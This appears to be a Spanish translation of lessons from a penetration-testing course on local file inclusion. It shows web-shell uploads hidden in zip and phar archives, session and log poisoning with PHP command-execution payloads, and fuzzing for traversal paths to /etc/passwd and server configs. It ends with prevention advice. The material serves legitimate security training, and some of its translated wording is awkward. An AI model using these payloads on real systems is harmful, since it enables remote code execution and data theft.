**Nota:** Como podemos ver, podemos usar 'gr/profile_images/shell.gifurg para la ruta del archivo. Si no sabemos dónde se carga el archivo, entonces podemos fuzz para un directorio de cargas y luego fuzz para nuestro archivo cargado, aunque esto no siempre funciona ya que algunas aplicaciones web ocultan correctamente los archivos cargados.

Con la ruta del archivo cargado a mano, todo lo que tenemos que hacer es incluir el archivo cargado en la función vulnerable LFI, y el código PHP debe ejecutarse, de la siguiente manera:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)

Como podemos ver, incluimos nuestro archivo y ejecutamos con éxito el `id` comando.

**Nota:** Para incluir en nuestro archivo cargado, utilizamos `./profile_images/` como en este caso, la vulnerabilidad LFI no prefija ningún directorio antes de nuestra entrada. En caso de que prefijara un directorio antes de nuestra entrada, simplemente necesitamos hacerlo `../` fuera de ese directorio y luego use nuestra ruta de URL, como aprendimos en secciones anteriores.

---

## Zip Cargar

Como se mencionó anteriormente, la técnica anterior es muy confiable y debería funcionar en la mayoría de los casos y con la mayoría de los marcos web, siempre que la función vulnerable permita la ejecución de código. Hay un par de otras técnicas de solo PHP que utilizan envoltorios PHP para lograr el mismo objetivo. Estas técnicas pueden ser útiles en algunos casos específicos donde la técnica anterior no funciona.

Podemos utilizar el [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper para ejecutar código PHP. Sin embargo, este envoltorio no está habilitado de forma predeterminada, por lo que es posible que este método no siempre funcione. Para hacerlo, podemos comenzar creando un script de shell web PHP y dividiéndolo en un archivo zip (llamado así `shell.jpg`), de la siguiente manera:

  LFI y Cargas de Archivos

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Nota:** Aunque nombramos nuestro archivo zip como (shell.jpg), algunos formularios de carga aún pueden detectar nuestro archivo como un archivo zip a través de pruebas de tipo de contenido y no permitir su carga, por lo que este ataque tiene una mayor probabilidad de funcionar si se permite la carga de archivos zip.

Una vez que subamos el `shell.jpg` archivo, podemos incluirlo con el `zip` envoltura como (`zip://shell.jpg`), y luego consulte cualquier archivo dentro de él con `#shell.php` (URL codificado). Finalmente, podemos ejecutar comandos como siempre lo hacemos con `&cmd=id`, como sigue:

   

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

Como podemos ver, este método también funciona en la ejecución de comandos a través de scripts PHP comprimidos.

**Nota:** Agregamos el directorio de cargas (`./profile_images/`) antes del nombre del archivo, como la página vulnerable (`index.php`) está en el directorio principal.

---

## Carga Phar

Finalmente, podemos usar el `phar://` envoltura para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un `shell.php` archivo:

Código: php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Este script se puede compilar en un `phar` archivo que cuando se llama escribiría un shell web a un `shell.txt` sub-archivo, con el que podemos interactuar. Podemos compilarlo en un `phar` archivar y cambiar el nombre a `shell.jpg` como sigue:

  LFI y Cargas de Archivos

```shell-session
vcrdcr@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Ahora, deberíamos tener un archivo phar llamado `shell.jpg`. Una vez que lo subamos a la aplicación web, simplemente podemos llamarlo con `phar://` y proporcione su ruta de URL, y luego especifique el subarchivo phar con `/shell.txt` (URL codificado) para obtener la salida del comando que especificamos con (`&cmd=id`), como sigue:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, el `id` el comando se ejecutó con éxito. Ambos el `zip` y `phar` los métodos de envoltura deben considerarse como métodos alternativos en caso de que el primer método no funcionara, ya que el primer método que discutimos es el más confiable entre los tres.

**Nota:** Hay otro ataque (obsoleto) de LFI/cargas que vale la pena señalar, que ocurre si las cargas de archivos están habilitadas en las configuraciones de PHP y el `phpinfo()` la página está de alguna manera expuesta a nosotros. Sin embargo, este ataque no es muy común, ya que tiene requisitos muy específicos para que funcione (LFI + cargas habilitadas + PHP antiguo + phpinfo()). Si está interesado en saber más al respecto, puede consultar [Este Enlace](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).

# Log Poisoning

Hemos visto en secciones anteriores que si incluimos algún archivo que contenga código PHP, se ejecutará, siempre y cuando la función vulnerable tenga el `Execute` privilegios. Los ataques que discutiremos en esta sección se basan en el mismo concepto: Escribir código PHP en un campo que controlamos que se registra en un archivo de registro (es decir. `poison`/`contaminate` el archivo de registro), y luego incluir ese archivo de registro para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debe tener privilegios de lectura sobre los archivos registrados, que varían de un servidor a otro.

Como fue el caso en el apartado anterior, cualquiera de las siguientes funciones con `Execute` los privilegios deben ser vulnerables a estos ataques:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodoJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NETO**||||
|`include`|✅|✅|✅|

---

## Envenenamiento de sesión PHP

La mayoría de las aplicaciones web PHP utilizan `PHPSESSID` cookies, que pueden contener datos específicos relacionados con el usuario en el back-end, por lo que la aplicación web puede realizar un seguimiento de los detalles del usuario a través de sus cookies. Estos detalles se almacenan en `session` archivos en el back-end y guardados en `/var/lib/php/sessions/` en Linux y en `C:\Windows\Temp\` en Windows. El nombre del archivo que contiene los datos de nuestro usuario coincide con el nombre de nuestro `PHPSESSID` cookie con el `sess_` prefijo. Por ejemplo, si el `PHPSESSID` la cookie está configurada para `el4ukv0kqbvoirg7nkp4dncpk3`, entonces su ubicación en el disco sería `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

Lo primero que tenemos que hacer en un ataque de Envenenamiento de Sesión PHP es examinar nuestro archivo de sesión PHPSESSID y ver si contiene algún dato que podamos controlar y envenenar. Entonces, primero verifiquemos si tenemos un `PHPSESSID` cookie establecida en nuestra sesión: ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

Como podemos ver, nuestro `PHPSESSID` el valor de la cookie es `nhhv8i0o6ua4g88bkdl9u1fdsd`, por lo que debe almacenarse en `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Intentemos incluir este archivo de sesión a través de la vulnerabilidad LFI y ver su contenido:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

**Nota:** Como puede adivinar fácilmente, el valor de la cookie diferirá de una sesión a otra, por lo que debe usar el valor de la cookie que encuentre en su propia sesión para realizar el mismo ataque.

Podemos ver que el archivo de sesión contiene dos valores: `page`, que muestra la página de idioma seleccionada, y `preference`, que muestra el idioma seleccionado. El `preference` el valor no está bajo nuestro control, ya que no lo especificamos en ninguna parte y debe especificarse automáticamente. Sin embargo, el `page` el valor está bajo nuestro control, ya que podemos controlarlo a través del `?language=` parámetro.

Intentemos establecer el valor de `page` un valor personalizado (p. ej. `language parameter`) y ver si cambia en el archivo de sesión. Podemos hacerlo simplemente visitando la página con `?language=session_poisoning` especificado, como sigue:

Código: url

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Ahora, vamos a incluir el archivo de sesión una vez más para ver el contenido:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

Esta vez, el archivo de sesión contiene `session_poisoning` en lugar de `es.php`, lo que confirma nuestra capacidad para controlar el valor de `page` en el archivo de sesión. Nuestro siguiente paso es realizar el `poisoning` paso escribiendo código PHP en el archivo de sesión. Podemos escribir un shell web PHP básico cambiando el `?language=` parámetro de un shell web codificado por URL, de la siguiente manera:

Código: url

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finalmente, podemos incluir el archivo de sesión y usar el `&cmd=id` para ejecutar comandos:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

Nota: Para ejecutar otro comando, el archivo de sesión debe envenenarse con el shell web nuevamente, a medida que se sobrescribe `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` después de nuestra última inclusión. Idealmente, usaríamos el shell web envenenado para escribir un shell web permanente en el directorio web, o enviar un shell inverso para facilitar la interacción.

---

## Envenenamiento de Registro de Servidor

Ambos `Apache` y `Nginx` mantener varios archivos de registro, como `access.log` y `error.log`. El `access.log` el archivo contiene información diversa sobre todas las solicitudes realizadas al servidor, incluidas las de cada solicitud `User-Agent` encabezado. Como podemos controlar el `User-Agent` encabezado en nuestras solicitudes, podemos usarlo para envenenar los registros del servidor como lo hicimos anteriormente.

Una vez envenenados, necesitamos incluir los registros a través de la vulnerabilidad LFI, y para eso necesitamos tener acceso de lectura sobre los registros. `Nginx` los registros son legibles por usuarios con privilegios bajos de forma predeterminada (por ejemplo. `www-data`), mientras que el `Apache` los registros solo son legibles por usuarios con altos privilegios (por ejemplo. `root`/`adm` grupos). Sin embargo, en más antiguo o mal configurado `Apache` servidores, estos registros pueden ser legibles por usuarios de bajo privilegio.

Por defecto, `Apache` los registros se encuentran en `/var/log/apache2/` en Linux y en `C:\xampp\apache\logs\` en Windows, mientras `Nginx` los registros se encuentran en `/var/log/nginx/` en Linux y en `C:\nginx\log\` en Windows. Sin embargo, los registros pueden estar en una ubicación diferente en algunos casos, por lo que podemos usar un [LFI Lista de palabras](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) para fuzz para sus ubicaciones, como se discutirá en la siguiente sección.

Entonces, intentemos incluir el registro de acceso de Apache desde `/var/log/apache2/access.log`, y ver lo que obtenemos:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

Como podemos ver, podemos leer el registro. El registro contiene el `remote IP address`, `request page`, `response code`, y el `User-Agent` encabezado. Como se mencionó anteriormente, el `User-Agent` el encabezado es controlado por nosotros a través de los encabezados de solicitud HTTP, por lo que deberíamos poder envenenar este valor.

**Consejo:** Los registros tienden a ser enormes, y cargarlos en una vulnerabilidad LFI puede tardar un tiempo en cargarse, o incluso bloquear el servidor en el peor de los casos. Por lo tanto, tenga cuidado y sea eficiente con ellos en un entorno de producción, y no envíe solicitudes innecesarias.

Para hacerlo, usaremos `Burp Suite` para interceptar nuestra solicitud anterior de LFI y modificar el `User-Agent` encabezado a `Apache Log Poisoning`: ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

**Nota:** Como todas las solicitudes al servidor se registran, podemos envenenar cualquier solicitud a la aplicación web, y no necesariamente la LFI como lo hicimos anteriormente.

Como era de esperar, nuestro valor personalizado User-Agent es visible en el archivo de registro incluido. Ahora, podemos envenenar el `User-Agent` encabezado configurándolo en un shell web PHP básico: ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

También podemos envenenar el registro enviando una solicitud a través de cURL, de la siguiente manera:

  Envenenamiento de Troncos

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Como el registro ahora debería contener código PHP, la vulnerabilidad LFI debería ejecutar este código y deberíamos poder obtener la ejecución remota de código. Podemos especificar un comando a ejecutar con (`?cmd=id`): ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

Vemos que ejecutamos con éxito el comando. Se puede llevar a cabo exactamente el mismo ataque `Nginx` registros también.

**Consejo:** El `User-Agent` el encabezado también se muestra en los archivos de proceso bajo Linux `/proc/` directorio. Entonces, podemos intentar incluir el `/proc/self/environ` o `/proc/self/fd/N` archivos (donde N es un PID por lo general entre 0-50), y podemos ser capaces de realizar el mismo ataque a estos archivos. Esto puede ser útil en caso de que no tuviéramos acceso de lectura a través de los registros del servidor, sin embargo, estos archivos solo pueden ser legibles por usuarios privilegiados.

Finalmente, hay otras técnicas similares de envenenamiento de registros que podemos utilizar en varios registros del sistema, dependiendo de los registros sobre los que hayamos leído el acceso. Los siguientes son algunos de los registros de servicio que podemos leer:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

Primero debemos intentar leer estos registros a través de LFI, y si tenemos acceso a ellos, podemos tratar de envenenarlos como lo hicimos anteriormente. Por ejemplo, si el `ssh` o `ftp` los servicios están expuestos a nosotros, y podemos leer sus registros a través de LFI, luego podemos intentar iniciar sesión en ellos y establecer el nombre de usuario en código PHP, y al incluir sus registros, el código PHP se ejecutaría. Lo mismo se aplica al `mail` servicios, como podemos enviar un correo electrónico que contiene código PHP, y tras su inclusión de registro, el código PHP se ejecutaría. Podemos generalizar esta técnica a cualquier registro que registre un parámetro que controlamos y que podamos leer a través de la vulnerabilidad LFI.

# Automated Scanning

Es esencial comprender cómo funcionan los ataques de inclusión de archivos y cómo podemos crear manualmente cargas útiles avanzadas y utilizar técnicas personalizadas para alcanzar la ejecución remota de código. Esto se debe a que, en muchos casos, para que podamos explotar la vulnerabilidad, puede requerir una carga útil personalizada que coincida con sus configuraciones específicas. Además, cuando se trata de medidas de seguridad como un WAF o un firewall, tenemos que aplicar nuestra comprensión para ver cómo se bloquea una carga/carácter útil específico e intentar crear una carga útil personalizada para evitarlo.

Es posible que no necesitemos explotar manualmente la vulnerabilidad LFI en muchos casos triviales. Existen muchos métodos automatizados que pueden ayudarnos a identificar y explotar rápidamente vulnerabilidades triviales de LFI. Podemos utilizar herramientas difusas para probar una gran lista de cargas útiles comunes de LFI y ver si alguna de ellas funciona, o podemos utilizar herramientas especializadas de LFI para probar tales vulnerabilidades. Esto es lo que discutiremos en esta sección.

---

## Parámetros de Fuzzing

Los formularios HTML que los usuarios pueden usar en el front-end de la aplicación web tienden a probarse adecuadamente y estar bien protegidos contra diferentes ataques web. Sin embargo, en muchos casos, la página puede tener otros parámetros expuestos que no están vinculados a ningún formulario HTML y, por lo tanto, los usuarios normales nunca accederían o causarían daños involuntarios. Es por eso que puede ser importante fuzz para los parámetros expuestos, ya que tienden a no ser tan seguros como los públicos.

El [Atacar Aplicaciones Web con Ffuf](https://academy.hackthebox.com/module/details/54) el módulo entra en detalles sobre cómo podemos fuzz para `GET`/`POST` parámetros. Por ejemplo, podemos fuzz la página para común `GET` parámetros, como sigue:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Una vez que identificamos un parámetro expuesto que no está vinculado a ningún formulario que probamos, podemos realizar todas las pruebas LFI discutidas en este módulo. Esto no es exclusivo de las vulnerabilidades LFI, sino que también se aplica a la mayoría de las vulnerabilidades web discutidas en otros módulos, ya que los parámetros expuestos también pueden ser vulnerables a cualquier otra vulnerabilidad.

**Consejo:** Para un escaneo más preciso, podemos limitar nuestro escaneo a los parámetros LFI más populares que se encuentran en esto [enlace](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

---

## Listas de palabras LFI

Hasta ahora, en este módulo, hemos estado elaborando manualmente nuestras cargas útiles LFI para probar las vulnerabilidades LFI. Esto se debe a que las pruebas manuales son más confiables y pueden encontrar vulnerabilidades de LFI que pueden no identificarse de otra manera, como se discutió anteriormente. Sin embargo, en muchos casos, es posible que deseemos ejecutar una prueba rápida en un parámetro para ver si es vulnerable a cualquier carga útil LFI común, lo que puede ahorrarnos tiempo en aplicaciones web donde necesitamos probar varias vulnerabilidades.

Hay varios [Listas de palabras LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) podemos utilizar para este escaneo. Una buena lista de palabras es [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), ya que contiene varios bypasses y archivos comunes, por lo que facilita la ejecución de varias pruebas a la vez. Podemos usar esta lista de palabras para borrar el `?language=` parámetro que hemos estado probando en todo el módulo, de la siguiente manera:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Como podemos ver, el escaneo produjo una serie de cargas útiles LFI que se pueden usar para explotar la vulnerabilidad. Una vez que tengamos las cargas útiles identificadas, debemos probarlas manualmente para verificar que funcionan como se esperaba y mostrar el contenido del archivo incluido.

---

## Archivos de Servidor Fuzzing

Además de borrar las cargas útiles de LFI, hay diferentes archivos de servidor que pueden ser útiles en nuestra explotación de LFI, por lo que sería útil saber dónde existen dichos archivos y si podemos leerlos. Tales archivos incluyen: `Server webroot path`, `server configurations file`, y `server logs`.

#### Servidor Webroot

Es posible que necesitemos conocer la ruta completa de la raíz web del servidor para completar nuestra explotación en algunos casos. Por ejemplo, si queríamos localizar un archivo que subimos, pero no podemos alcanzar su `/uploads` directorio a través de rutas relativas (p. ej. `../../uploads`). En tales casos, es posible que tengamos que averiguar la ruta webroot del servidor para que podamos localizar nuestros archivos cargados a través de rutas absolutas en lugar de rutas relativas.

Para hacerlo, podemos fuzz para el `index.php` archivo a través de rutas de webroot comunes, que podemos encontrar en este [lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o esto [lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Dependiendo de nuestra situación de LFI, es posible que tengamos que agregar algunos directorios (por ejemplo. `../../../../`), y luego añadir nuestro `index.php` palabras clave.

El siguiente es un ejemplo de cómo podemos hacer todo esto con ffuf:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Como podemos ver, el escaneo identificó la ruta correcta de la raíz web en (`/var/www/html/`). También podemos usar lo mismo [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) lista de palabras que usamos anteriormente, ya que también contiene varias cargas útiles que pueden revelar la raíz web. Si esto no nos ayuda a identificar el webroot, entonces nuestra mejor opción sería leer las configuraciones del servidor, ya que tienden a contener el webroot y otra información importante, como veremos a continuación.

#### Registros/Configuraciones del Servidor

Como hemos visto en la sección anterior, necesitamos poder identificar el directorio de registros correcto para poder realizar los ataques de envenenamiento de registros que discutimos. Además, como acabamos de discutir, es posible que también necesitemos leer las configuraciones del servidor para poder identificar la ruta de la raíz web del servidor y otra información importante (¡como la ruta de los registros!).

Para hacerlo, también podemos usar el [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, ya que contiene muchos de los registros del servidor y las rutas de configuración que nos pueden interesar. Si quisiéramos un escaneo más preciso, podemos usar esto [lista de palabras para Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) o esto [lista de palabras para Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), aunque no son parte de `seclists`, así que tenemos que descargarlos primero. Probemos la lista de palabras de Linux contra nuestra vulnerabilidad LFI y veamos qué obtenemos:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

Como podemos ver, el escaneo devolvió más de 60 resultados, muchos de los cuales no se identificaron con el [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, que nos muestra que un escaneo preciso es importante en ciertos casos. Ahora, podemos intentar leer cualquiera de estos archivos para ver si podemos obtener su contenido. Leeremos (`/etc/apache2/apache2.conf`), ya que es una ruta conocida para la configuración del servidor apache:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

Como podemos ver, obtenemos la ruta de raíz web predeterminada y la ruta de registro. Sin embargo, en este caso, la ruta de registro está utilizando una variable apache global (`APACHE_LOG_DIR`), que se encuentran en otro archivo que vimos anteriormente, que es (`/etc/apache2/envvars`), y podemos leerlo para encontrar los valores variables:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

Como podemos ver, el (`APACHE_LOG_DIR`) La variable se establece en (`/var/log/apache2`), y la configuración anterior nos dijo que los archivos de registro son `/access.log` y `/error.log`, que han accedido en la sección anterior.

**Nota:** Por supuesto, simplemente podemos usar una lista de palabras para encontrar los registros, ya que varias listas de palabras que usamos en estas secciones mostraron la ubicación del registro. Pero este ejercicio nos muestra cómo podemos revisar manualmente los archivos identificados y luego usar la información que encontramos para identificar más archivos e información importante. Esto es bastante similar a cuando leemos diferentes fuentes de archivos en el `PHP filters` sección, y tales esfuerzos pueden revelar información previamente desconocida sobre la aplicación web, que podemos utilizar para explotarla aún más.

---

## herramientas LFI

Finalmente, podemos utilizar una serie de herramientas LFI para automatizar gran parte del proceso que hemos estado aprendiendo, lo que puede ahorrar tiempo en algunos casos, pero también puede perder muchas vulnerabilidades y archivos que de otro modo podríamos identificar a través de pruebas manuales. Las herramientas LFI más comunes son [LFISuita](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), y [liffy](https://github.com/mzfr/liffy). También podemos buscar GitHub para varias otras herramientas y scripts LFI, pero en general, la mayoría de las herramientas realizan las mismas tareas, con diferentes niveles de éxito y precisión.

Desafortunadamente, la mayoría de estas herramientas no se mantienen y dependen de lo obsoleto `python2`, por lo tanto, usarlos puede no ser una solución a largo plazo. Intente descargar cualquiera de las herramientas anteriores y pruébelas en cualquiera de los ejercicios que hemos utilizado en este módulo para ver su nivel de precisión.

# File Inclusion Prevention

Este módulo ha discutido varias formas de detectar y explotar vulnerabilidades de inclusión de archivos, junto con diferentes omisiones de seguridad y técnicas de ejecución remota de código que podemos utilizar. Con esa comprensión de cómo identificar vulnerabilidades de inclusión de archivos a través de pruebas de penetración, ahora deberíamos aprender cómo parchear estas vulnerabilidades y endurecer nuestros sistemas para reducir las posibilidades de que ocurran y reducir el impacto si lo hacen.

---

## Prevención de Inclusión de Archivos

Lo más efectivo que podemos hacer para reducir las vulnerabilidades de inclusión de archivos es evitar pasar entradas controladas por el usuario a cualquier función de inclusión de archivos o API. La página debería poder cargar dinámicamente los activos en el back-end, sin interacción del usuario. Además, en la primera sección de este módulo, discutimos diferentes funciones que pueden utilizarse para incluir otros archivos dentro de una página y mencionamos los privilegios que tiene cada función. Siempre que se use cualquiera de estas funciones, debemos asegurarnos de que ninguna entrada del usuario entre directamente en ellas. Por supuesto, esta lista de funciones no es completa, por lo que generalmente deberíamos considerar cualquier función que pueda leer archivos.

En algunos casos, esto puede no ser factible, ya que puede requerir cambiar toda la arquitectura de una aplicación web existente. En tales casos, debemos utilizar una lista blanca limitada de entradas de usuario permitidas y hacer coincidir cada entrada con el archivo que se cargará, mientras que tenemos un valor predeterminado para todas las demás entradas. Si estamos tratando con una aplicación web existente, podemos crear una lista blanca que contenga todas las rutas existentes utilizadas en el front-end, y luego utilizar esta lista para que coincida con la entrada del usuario. Tal lista blanca puede tener muchas formas, como una tabla de base de datos que coincide con ID a archivos, a `case-match` script que hace coincidir los nombres con los archivos, o incluso un mapa json estático con nombres y archivos que se pueden combinar.

Una vez que esto se implementa, la entrada del usuario no entra en la función, pero los archivos coincidentes se utilizan en la función, lo que evita vulnerabilidades de inclusión de archivos.

---

## Prevención del recorrido del Directorio

Si los atacantes pueden controlar el directorio, pueden escapar de la aplicación web y atacar algo con lo que están más familiarizados o usar un `universal attack chain`. Como hemos discutido a lo largo del módulo, el salto de directorio podría permitir a los atacantes hacer cualquiera de los siguientes:

- Leer `/etc/passwd` y potencialmente encontrar claves SSH o conocer nombres de usuario válidos para un ataque de rociado de contraseña
- Encuentra otros servicios en la caja como Tomcat y lee el `tomcat-users.xml` archivo
- Descubra las cookies de sesión PHP válidas y realice el secuestro de sesión
- Lea la configuración actual de la aplicación web y el código fuente

La mejor manera de evitar el salto de directorio es usar la herramienta integrada de su lenguaje de programación (o marco) para extraer solo el nombre de archivo. Por ejemplo, PHP tiene `basename()`, que leerá la ruta y solo devolverá la parte del nombre del archivo. Si solo se da un nombre de archivo, devolverá solo el nombre de archivo. Si solo se da la ruta, tratará lo que sea después de la final / como el nombre del archivo. La desventaja de este método es que si la aplicación necesita ingresar directorios, no podrá hacerlo.

